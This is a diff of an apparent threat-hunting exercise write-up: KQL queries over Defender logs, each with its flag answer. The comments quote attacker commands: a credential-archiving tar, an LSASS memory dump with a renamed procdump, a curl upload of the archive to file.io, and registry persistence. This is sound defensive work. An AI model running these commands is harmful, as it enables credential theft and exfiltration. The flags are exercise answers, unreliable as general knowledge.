@@ -137,7 +137,9 @@ DeviceProcessEvents
 | project Timestamp, ProcessCommandLine, FileName, InitiatingProcessFileName
 | order by Timestamp asc
 // Flag 13 = "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin . 
+```
 
+```
 //Flag 14
 DeviceFileEvents
 | where Timestamp between (datetime(2025-11-22) .. datetime(2025-11-23))
@@ -146,7 +148,9 @@ DeviceFileEvents
 | where ActionType == "FileCreated"
 | where FileName endswith ".exe"
 // Flag 14 = pd.exe
+```
 
+```
 // Flag 15
 DeviceProcessEvents
 | where Timestamp between (datetime(2025-11-22) .. datetime(2025-11-23))
@@ -154,7 +158,9 @@ DeviceProcessEvents
 | where ProcessCommandLine contains "pd.exe"
 // Flag 15= 
 //"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
+```
 
+```
 // Flag 16
 DeviceProcessEvents
 | where Timestamp between (datetime(2025-11-20) .. datetime(2025-11-23))
@@ -162,11 +168,15 @@ DeviceProcessEvents
 | where ProcessCommandLine contains "curl"
 | project Timestamp, FileName, ProcessCommandLine
 // Flag 16 = "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
+```
 
+```
 //Flag 17 
 // Same KQL query as Flag 16
 // Flag 17 = file.ioAlertEvidence
+```
 
+```
 //Flag 18 
 DeviceRegistryEvents
 | where Timestamp between (datetime(2025-11-22) .. datetime(2025-11-23))
@@ -174,7 +184,9 @@ DeviceRegistryEvents
 //| where ActionType contains "RegistryValueset" or ActionType contains "RegistryValueset"
 | distinct RegistryValueName
 // Flag 18 = FileShareSync
+```
 
+```
 // Flag 19
 DeviceRegistryEvents
 | where Timestamp between (datetime(2025-11-22) .. datetime(2025-11-23))
@@ -182,7 +194,9 @@ DeviceRegistryEvents
 //| where ActionType contains "RegistryValueset" or ActionType contains "RegistryValueset"
 | where RegistryValueName == "FileShareSync"
 // Flag 19 = svchost.ps1
+```
 
+```
 // Flag 20 
 DeviceFileEvents
 | where Timestamp between (datetime(2025-11-22) .. datetime(2025-11-23))
